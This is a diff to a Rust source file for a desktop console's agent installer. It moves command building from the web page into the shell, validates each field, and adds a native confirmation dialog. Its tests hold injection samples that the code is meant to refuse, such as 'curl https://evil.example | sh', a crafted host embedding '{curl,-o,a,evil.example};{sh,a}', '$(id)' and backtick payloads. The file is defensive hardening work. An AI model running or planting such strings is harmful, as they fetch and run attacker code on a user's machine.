@@ -1,10 +1,19 @@
-//! "Deploy on this Device": run the agent install command on the machine the
-//! console is running on, with administrator rights, and stream what it prints
-//! back to the setup wizard.
+//! "Deploy on this Device": install the agent on the machine the console is
+//! running on, with administrator rights, and stream what it prints back to the
+//! setup wizard.
 //!
-//! The command is the same one the wizard offers to copy - the web app builds
-//! it and hands it over verbatim - so the shell adds exactly two things a
-//! browser tab cannot: the elevation prompt and a place to run it.
+//! The page never hands over a command. Whatever runs in the webview can call
+//! this, and a string from there running behind the admin prompt would make any
+//! script injected into the page root on this machine. So the page sends the
+//! four values only it knows ([`InstallRequest`]), each held to the shape the
+//! backend gives it, and the shell writes the command itself: the same text the
+//! wizard offers to copy (a fixture pins the two together), against the tenant
+//! the shell learned at login rather than one the page names.
+//!
+//! That still leaves a page script able to enrol this machine in a workspace of its
+//! own: it can sign in to one, and the agent it installs is the real one. So nothing
+//! is elevated until the person answers a native dialog naming the tenant, which
+//! nothing in the webview can draw or answer ([`confirmed_by_user`]).
 //!
 //! Elevation goes through the OS's own prompt, never a password of ours:
 //! `osascript ... with administrator privileges` on macOS, `Start-Process
@@ -21,7 +30,7 @@
 
 use std::sync::atomic::AtomicBool;
 
-use serde::Serialize;
+use serde::{Deserialize, Serialize};
 use tauri::{AppHandle, State, WebviewWindow};
 
 use crate::MAIN_LABEL;
@@ -31,11 +40,12 @@ use crate::MAIN_LABEL;
 /// rather than one per line.
 pub const EVENT_OUTPUT: &str = "agent-install:output";
 /// The run is over: success, the exit code when the command ran, and the error
-/// when it did not (the elevation prompt declined, the launcher failed).
+/// when it did not (the confirmation or the elevation prompt declined, the launcher
+/// failed).
 pub const EVENT_DONE: &str = "agent-install:done";
 
 /// One install at a time: a second "Deploy on this Device" while one is running
-/// is answered with [`InstallError::busy`] instead of a second elevation prompt.
+/// is answered with [`InstallError::busy`] instead of a second confirmation.
 #[derive(Default)]
 pub struct InstallerState {
     running: AtomicBool,
@@ -67,8 +77,8 @@ impl InstallError {
         }
     }
 
-    /// Our own precondition failed: a call from the wrong window, an empty
-    /// command. Nothing the user can retry.
+    /// Our own precondition failed: a call from the wrong or a hidden window, a
+    /// refused value, no workspace to install for.
     fn unavailable(message: impl Into<String>) -> Self {
         Self {
             kind: "unavailable",
@@ -86,12 +96,12 @@ impl InstallError {
         }
     }
 
-    /// The user declined the elevation prompt.
+    /// The user declined the confirmation or the elevation prompt.
     #[cfg(any(target_os = "macos", target_os = "windows"))]
     fn cancelled() -> Self {
         Self {
             kind: "cancelled",
-            message: "the administrator prompt was declined".into(),
+            message: "the install was declined".into(),
         }
     }
 
@@ -104,6 +114,177 @@ impl InstallError {
             message: message.into(),
         }
     }
+}
+
+/// The longest value [`is_install_arg`] takes: well past the 32-character keys
+/// and 36-character UUIDs the backend issues.
+const MAX_INSTALL_ARG_LEN: usize = 128;
+
+/// One value bound for the agent's command line. Registration keys are
+/// alphanumeric now and base64url on tenants that predate that; ids are UUIDs.
+/// None of those need anything a shell or PowerShell reads as syntax, so the
+/// command carries them unquoted exactly as the copied one does. A leading `-`
+/// is refused because the agent's CLI would take the value for a flag.
+pub(crate) fn is_install_arg(value: &str) -> bool {
+    (1..=MAX_INSTALL_ARG_LEN).contains(&value.len())
+        && !value.starts_with('-')
+        && value
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_'))
+}
+
+/// What only the page knows about the install. The host is not here on purpose:
+/// the agent is downloaded from, and enrolled with, the tenant the shell holds.
+/// `deny_unknown_fields`, so a caller still sending a `command` is refused
+/// rather than quietly ignored. No `Debug`: `initial_key` must never reach the log.
+#[derive(Deserialize)]
+#[serde(rename_all = "camelCase", deny_unknown_fields)]
+pub struct InstallRequest {
+    org_id: String,
+    initial_key: String,
+    log_key: Option<String>,
+    user_id: Option<String>,
+}
+
+impl InstallRequest {
+    /// Names the field and never the value: the key is the workspace's secret and
+    /// this message reaches the log.
+    fn validate(&self) -> Result<(), InstallError> {
+        let fields = [
+            ("orgId", Some(&self.org_id)),
+            ("initialKey", Some(&self.initial_key)),
+            ("logKey", self.log_key.as_ref()),
+            ("userId", self.user_id.as_ref()),
+        ];
+        for (name, value) in fields {
+            if value.is_some_and(|value| !is_install_arg(value)) {
+                return Err(InstallError::unavailable(format!(
+                    "the install request has an invalid {name}"
+                )));
+            }
+        }
+        Ok(())
+    }
+}
+
+/// The OS whose command to write. A value rather than a `cfg` so both commands
+/// are built and tested on either host.
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+#[derive(Clone, Copy)]
+enum InstallOs {
+    Macos,
+    Windows,
+}
+
+#[cfg(any(target_os = "macos", target_os = "windows"))]
+impl InstallOs {
+    fn current() -> Self {
+        if cfg!(target_os = "windows") {
+            Self::Windows
+        } else {
+            Self::Macos
+        }
+    }
+}
+
+/// `--serverUrl` for the tenant at `origin`. A gateway on the developer's own box
+/// needs `--localMode` as well, which is what `withLocalMode` in apps/web adds to
+/// the copied command.
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn server_arg(origin: &url::Url) -> String {
+    if crate::is_loopback_host(origin.host_str().unwrap_or_default()) {
+        "localhost --localMode".to_string()
+    } else {
+        enrolled_host(origin)
+    }
+}
+
+/// The tenant at `origin` as the agent enrols with it, and so as the dialog and the
+/// admin prompt have to name it.
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn enrolled_host(origin: &url::Url) -> String {
+    origin.authority().to_string()
+}
+
+/// The install command, identical to `buildInstallCommand` in apps/web for the
+/// same inputs: `install-command.json` holds the expected text and a test on each
+/// side reads it. Every interpolated value has passed [`is_install_arg`] or came
+/// from `crate::tenant_origin`; `machine_id` is the shell's own UUID.
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn install_command(
+    os: InstallOs,
+    origin: &url::Url,
+    request: &InstallRequest,
+    machine_id: &str,
+) -> String {
+    let server = server_arg(origin);
+    let base = origin.origin().ascii_serialization();
+    let mut args = format!(
+        "install --serverUrl {server} --initialKey {}",
+        request.initial_key
+    );
+    if let Some(log_key) = &request.log_key {
+        args.push_str(&format!(" --logKey {log_key}"));
+    }
+    args.push_str(&format!(" --orgId {}", request.org_id));
+    if let Some(user_id) = &request.user_id {
+        args.push_str(&format!(" --userId {user_id}"));
+    }
+    match os {
+        InstallOs::Macos => format!(
+            "cd ~ && rm -f openframe-client_macos.tar.gz openframe-client 2>/dev/null; curl -fL -H 'x-machine-id: {machine_id}' -o openframe-client_macos.tar.gz '{base}/v0/api/assets/download?agent=client&platform=macos' && tar -xzf openframe-client_macos.tar.gz && sudo chmod +x ./openframe-client && sudo ./openframe-client {args}"
+        ),
+        InstallOs::Windows => format!(
+            "Set-Location ~; Remove-Item -Path 'openframe-client.zip','openframe-client.exe' -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri '{base}/v0/api/assets/download?agent=client&platform=windows' -Headers @{{ 'x-machine-id' = '{machine_id}' }} -OutFile 'openframe-client.zip'; Expand-Archive -Path 'openframe-client.zip' -DestinationPath '.' -Force; & '.\\openframe-client.exe' {args}"
+        ),
+    }
+}
+
+/// What the confirmation says: what is about to happen, to whom this machine will
+/// answer, and what that means.
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn confirmation_text(tenant_host: &str) -> (&'static str, String) {
+    (
+        "Install the OpenFrame agent?",
+        format!(
+            "This installs the OpenFrame agent on this computer with administrator rights and connects it to:\n\n{tenant_host}\n\nThat workspace will be able to manage and remotely access this computer. Choose OK only if you recognize it."
+        ),
+    )
+}
+
+/// The person's answer, before anything is written to disk or elevated. A native
+/// dialog, because a page script is what this guards against: it can call this
+/// command, but it cannot see, draw or answer what appears here. Anything but OK is
+/// a no. Waits for the answer, so never on the main thread, where a sync command runs.
+///
+/// `AsyncMessageDialog`, not `MessageDialog`: on macOS the blocking one sits in a modal
+/// loop on the main thread, where every sync command and window event also runs. The
+/// async one begins the sheet and leaves the main thread free.
+#[cfg(any(target_os = "macos", target_os = "windows"))]
+fn confirmed_by_user(window: &WebviewWindow, tenant_host: &str) -> bool {
+    let (title, description) = confirmation_text(tenant_host);
+    let answer = rfd::AsyncMessageDialog::new()
+        .set_level(rfd::MessageLevel::Warning)
+        .set_title(title)
+        .set_description(description)
+        .set_buttons(rfd::MessageButtons::OkCancel)
+        .set_parent(window)
+        .show();
+    tauri::async_runtime::block_on(answer) == rfd::MessageDialogResult::Ok
+}
+
+/// The tenant to install against: the one login taught the shell, held to the
+/// same rule as when it was learned, because `config.json` may predate the rule.
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn install_target(cfg: &crate::AppConfig) -> Result<url::Url, InstallError> {
+    let host = crate::tenant_host(cfg)
+        .ok_or_else(|| InstallError::unavailable("no workspace to install for"))?;
+    crate::tenant_origin(&host, crate::shared_host(cfg).as_deref())
+        .and_then(|origin| url::Url::parse(&origin).map_err(|error| error.to_string()))
+        .map_err(|error| {
+            log::warn!("agent install: refusing the learned tenant host: {error}");
+            InstallError::unavailable("the workspace host is not one this app may install from")
+        })
 }
 
 #[derive(Clone, Serialize)]
@@ -121,33 +302,57 @@ struct DoneEvent {
     error: Option<InstallError>,
 }
 
-/// Start the install command on this machine. Returns as soon as the run is
-/// under way; everything after that arrives as [`EVENT_OUTPUT`] and one
+#[cfg(any(target_os = "macos", target_os = "windows"))]
+impl DoneEvent {
+    /// The run ended without the command's own exit code.
+    fn not_run(error: InstallError) -> Self {
+        Self {
+            success: false,
+            exit_code: None,
+            error: Some(error),
+        }
+    }
+}
+
+/// Start the agent install on this machine. Returns once the call is accepted; the
+/// person's answer and everything after it arrive as [`EVENT_OUTPUT`] and one
 /// [`EVENT_DONE`] on the main window.
 #[tauri::command]
 pub fn agent_install_start(
     app: AppHandle,
     window: WebviewWindow,
     state: State<'_, InstallerState>,
-    command: String,
+    request: InstallRequest,
 ) -> Result<(), InstallError> {
     if window.label() != MAIN_LABEL {
         return Err(InstallError::unavailable(
             "an install can only be started from the main window",
         ));
     }
-    let command = command.trim().to_string();
-    if command.is_empty() {
-        return Err(InstallError::unavailable("no install command"));
-    }
+    request.validate()?;
     #[cfg(not(any(target_os = "macos", target_os = "windows")))]
     {
-        let _ = (app, state, command);
+        let _ = (app, state);
         Err(InstallError::unsupported())
     }
     #[cfg(any(target_os = "macos", target_os = "windows"))]
     {
         use std::sync::atomic::Ordering;
+        let origin = install_target(&crate::load_config(&app))?;
+        let tenant_host = enrolled_host(&origin);
+        // The page keeps running in a window hidden to the tray, and a dialog
+        // attached to a window nobody can see would be waiting on nobody.
+        if !window.is_visible().unwrap_or(false) {
+            return Err(InstallError::unavailable(
+                "an install can only be started from a visible window",
+            ));
+        }
+        let command = install_command(
+            InstallOs::current(),
+            &origin,
+            &request,
+            &uuid::Uuid::new_v4().to_string(),
+        );
         if state
             .running
             .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
@@ -155,17 +360,19 @@ pub fn agent_install_start(
         {
             return Err(InstallError::busy());
         }
-        let run = match run::RunDir::create(&command) {
-            Ok(run) => run,
-            Err(error) => {
-                state.running.store(false, Ordering::Release);
-                log::warn!("agent install: could not prepare the run: {error}");
-                return Err(InstallError::io(error));
-            }
-        };
         std::thread::spawn(move || {
             use tauri::{Emitter, Manager};
-            let done = run::execute(&app, run);
+            let done = if confirmed_by_user(&window, &tenant_host) {
+                match run::RunDir::create(&command) {
+                    Ok(run) => run::execute(&app, run, &tenant_host),
+                    Err(error) => {
+                        log::warn!("agent install: could not prepare the run: {error}");
+                        DoneEvent::not_run(InstallError::io(error))
+                    }
+                }
+            } else {
+                DoneEvent::not_run(InstallError::cancelled())
+            };
             log::info!(
                 "agent install finished: success={} exit_code={:?} error={:?}",
                 done.success,
@@ -203,7 +410,7 @@ mod run {
     /// The files of one run, in a directory only this user can read.
     pub(super) struct RunDir {
         dir: PathBuf,
-        /// The install command as the web app built it.
+        /// The install command, from [`install_command`](super::install_command).
         script: PathBuf,
         /// The elevated entry point: runs `script` into `log`, writes `status`.
         runner: PathBuf,
@@ -329,13 +536,26 @@ mod run {
         )
     }
 
+    /// The AppleScript that raises the prompt. It names the tenant again because the
+    /// password is what the person is really being asked for here. UAC has no room for
+    /// text of ours, which is part of why [`confirmed_by_user`](super::confirmed_by_user)
+    /// comes first.
     #[cfg(target_os = "macos")]
-    fn launch(run: &RunDir) -> std::io::Result<Child> {
-        let shell_line = format!("/bin/bash {}", sh_quote(&run.runner));
-        let apple = format!(
-            "do shell script \"{}\" with administrator privileges",
-            applescript_escape(&shell_line)
+    fn elevation_script(runner: &Path, tenant_host: &str) -> String {
+        let shell_line = format!("/bin/bash {}", sh_quote(runner));
+        let prompt = format!(
+            "OpenFrame Console wants to install the OpenFrame agent and connect this device to {tenant_host}."
         );
+        format!(
+            "do shell script \"{}\" with prompt \"{}\" with administrator privileges",
+            applescript_escape(&shell_line),
+            applescript_escape(&prompt)
+        )
+    }
+
+    #[cfg(target_os = "macos")]
+    fn launch(run: &RunDir, tenant_host: &str) -> std::io::Result<Child> {
+        let apple = elevation_script(&run.runner, tenant_host);
         Command::new("osascript")
             .arg("-e")
             .arg(apple)
@@ -346,7 +566,7 @@ mod run {
     }
 
     #[cfg(target_os = "windows")]
-    fn launch(run: &RunDir) -> std::io::Result<Child> {
+    fn launch(run: &RunDir, _tenant_host: &str) -> std::io::Result<Child> {
         use std::os::windows::process::CommandExt;
         /// CREATE_NO_WINDOW: the unelevated launcher gets no console of its own.
         const CREATE_NO_WINDOW: u32 = 0x0800_0000;
@@ -425,16 +645,12 @@ mod run {
 
     /// Run to completion: launch, tail the log while the launcher lives, then
     /// settle the outcome from the status file and the launcher's stderr.
-    pub(super) fn execute(app: &AppHandle, run: RunDir) -> DoneEvent {
-        let mut child = match launch(&run) {
+    pub(super) fn execute(app: &AppHandle, run: RunDir, tenant_host: &str) -> DoneEvent {
+        let mut child = match launch(&run, tenant_host) {
             Ok(child) => child,
             Err(error) => {
                 log::warn!("agent install: launcher did not start: {error}");
-                return DoneEvent {
-                    success: false,
-                    exit_code: None,
-                    error: Some(InstallError::io(error)),
-                };
+                return DoneEvent::not_run(InstallError::io(error));
             }
         };
         // Drained on its own thread: a pipe nobody reads blocks the writer.
@@ -504,11 +720,7 @@ mod run {
                         detail.to_string()
                     })
                 };
-                DoneEvent {
-                    success: false,
-                    exit_code: None,
-                    error: Some(error),
-                }
+                DoneEvent::not_run(error)
             }
         }
     }
@@ -539,6 +751,16 @@ mod run {
         #[test]
         fn applescript_escape_handles_quotes_and_backslashes() {
             assert_eq!(applescript_escape(r#"a "b" \c"#), r#"a \"b\" \\c"#);
+        }
+
+        #[cfg(target_os = "macos")]
+        #[test]
+        fn the_admin_prompt_names_the_tenant() {
+            let script = elevation_script(Path::new("/tmp/o'brien/run.sh"), "acme.openframe.ai");
+            assert_eq!(
+                script,
+                "do shell script \"/bin/bash '/tmp/o'\\\\''brien/run.sh'\" with prompt \"OpenFrame Console wants to install the OpenFrame agent and connect this device to acme.openframe.ai.\" with administrator privileges"
+            );
         }
 
         #[cfg(target_os = "windows")]
@@ -574,5 +796,186 @@ mod run {
             drop(run);
             assert!(!dir.exists());
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn request() -> InstallRequest {
+        InstallRequest {
+            org_id: "org-1".into(),
+            initial_key: "secret-1".into(),
+            log_key: None,
+            user_id: None,
+        }
+    }
+
+    fn origin(text: &str) -> url::Url {
+        url::Url::parse(text).unwrap()
+    }
+
+    /// Both sides of the bridge read this file, which pins the command the shell runs
+    /// to the one the wizard offers to copy, and `request` to what the shell accepts.
+    #[test]
+    fn the_command_matches_the_one_the_wizard_copies() {
+        let fixture: serde_json::Value =
+            serde_json::from_str(include_str!("install-command.json")).unwrap();
+        for case in fixture["cases"].as_array().unwrap() {
+            let request: InstallRequest = serde_json::from_value(case["request"].clone()).unwrap();
+            request.validate().unwrap();
+            let origin = origin(case["downloadBaseUrl"].as_str().unwrap());
+            let machine_id = case["machineId"].as_str().unwrap();
+            for (os, key) in [
+                (InstallOs::Macos, "darwin"),
+                (InstallOs::Windows, "windows"),
+            ] {
+                assert_eq!(
+                    install_command(os, &origin, &request, machine_id),
+                    case["commands"][key].as_str().unwrap()
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn a_gateway_on_this_box_installs_in_local_mode() {
+        for base in ["http://localhost:8443", "http://127.0.0.1:8443"] {
+            let command = install_command(InstallOs::Macos, &origin(base), &request(), "id");
+            assert!(command.contains("--serverUrl localhost --localMode --initialKey"));
+            assert!(command.contains(&format!("'{base}/v0/api/assets/download?")));
+        }
+    }
+
+    #[test]
+    fn the_confirmation_names_the_tenant_and_what_it_will_be_able_to_do() {
+        let (title, description) = confirmation_text("acme.openframe.ai");
+        assert!(title.contains("OpenFrame agent"));
+        assert!(description.contains("\n\nacme.openframe.ai\n\n"));
+        assert!(description.contains("remotely access this computer"));
+    }
+
+    #[test]
+    fn the_dialog_names_the_host_the_agent_enrols_with() {
+        let tenant = origin("https://acme.openframe.ai:8443");
+        assert_eq!(enrolled_host(&tenant), "acme.openframe.ai:8443");
+        assert_eq!(server_arg(&tenant), enrolled_host(&tenant));
+        let (_, description) = confirmation_text(&enrolled_host(&tenant));
+        assert!(description.contains("\n\nacme.openframe.ai:8443\n\n"));
+    }
+
+    /// `config.json` may hold a host from before the rule, so the install holds it to
+    /// the rule again rather than trusting what login stored.
+    #[test]
+    fn a_crafted_learned_host_is_refused_at_install() {
+        let cfg = |learned: Option<&str>| crate::AppConfig {
+            shared_host: Some("https://openframe.ai".into()),
+            learned_host: learned.map(str::to_string),
+            ..crate::AppConfig::default()
+        };
+        let target = install_target(&cfg(Some("https://acme.openframe.ai"))).unwrap();
+        assert_eq!(target.as_str(), "https://acme.openframe.ai/");
+        for learned in [
+            Some("https://x';{curl,-o,a,evil.example};{sh,a};'.openframe.ai"),
+            Some("https://evil.example"),
+            None,
+        ] {
+            let error = install_target(&cfg(learned)).unwrap_err();
+            assert_eq!(error.kind, "unavailable", "{learned:?}");
+        }
+    }
+
+    #[test]
+    fn install_args_take_what_the_backend_issues() {
+        for value in [
+            "AbC123",
+            "0f8fad5b-d9cb-469f-a165-70867728950e",
+            "aB3_x-Zk",
+            "_leading_underscore",
+            &"k".repeat(MAX_INSTALL_ARG_LEN),
+        ] {
+            assert!(is_install_arg(value), "{value}");
+        }
+    }
+
+    #[test]
+    fn install_args_refuse_anything_a_shell_or_the_cli_would_read() {
+        for value in [
+            "",
+            "-rf",
+            "--serverUrl",
+            "a b",
+            "a;b",
+            "a&b",
+            "a|b",
+            "$(id)",
+            "`id`",
+            "a'b",
+            "a\"b",
+            "a\nb",
+            "a\\b",
+            "a/b",
+            "a=b",
+            "a%b",
+            "é",
+            &"k".repeat(MAX_INSTALL_ARG_LEN + 1),
+        ] {
+            assert!(!is_install_arg(value), "{value:?}");
+        }
+    }
+
+    #[test]
+    fn every_field_is_validated_and_the_error_names_it_without_the_value() {
+        type SetField = fn(&mut InstallRequest, String);
+        let cases: [(&str, SetField); 4] = [
+            ("orgId", |r, v| r.org_id = v),
+            ("initialKey", |r, v| r.initial_key = v),
+            ("logKey", |r, v| r.log_key = Some(v)),
+            ("userId", |r, v| r.user_id = Some(v)),
+        ];
+        for (name, set) in cases {
+            let mut bad = request();
+            set(&mut bad, "x; curl evil | sh".into());
+            let error = bad.validate().unwrap_err();
+            assert_eq!(error.kind, "unavailable");
+            assert!(error.message.contains(name), "{}", error.message);
+            assert!(!error.message.contains("curl"), "{}", error.message);
+        }
+        request().validate().unwrap();
+    }
+
+    #[test]
+    fn a_command_string_from_the_page_does_not_deserialize() {
+        let refused = serde_json::from_value::<InstallRequest>(serde_json::json!({
+            "orgId": "org-1",
+            "initialKey": "secret-1",
+            "command": "curl https://evil.example | sh",
+        }));
+        assert!(refused.is_err());
+        let accepted = serde_json::from_value::<InstallRequest>(serde_json::json!({
+            "orgId": "org-1",
+            "initialKey": "secret-1",
+            "logKey": null,
+        }));
+        assert!(accepted.is_ok());
+    }
+
+    /// bash itself is the judge of the macOS command, and of a value that would
+    /// break out of it had the validation let it through.
+    #[cfg(unix)]
+    #[test]
+    fn the_macos_command_is_valid_bash() {
+        let command = install_command(
+            InstallOs::Macos,
+            &origin("https://acme.openframe.ai"),
+            &request(),
+            "0f8fad5b-d9cb-469f-a165-70867728950e",
+        );
+        let status = std::process::Command::new("/bin/bash")
+            .args(["-n", "-c", &command])
+            .status()
+            .unwrap();
+        assert!(status.success());
     }
 }
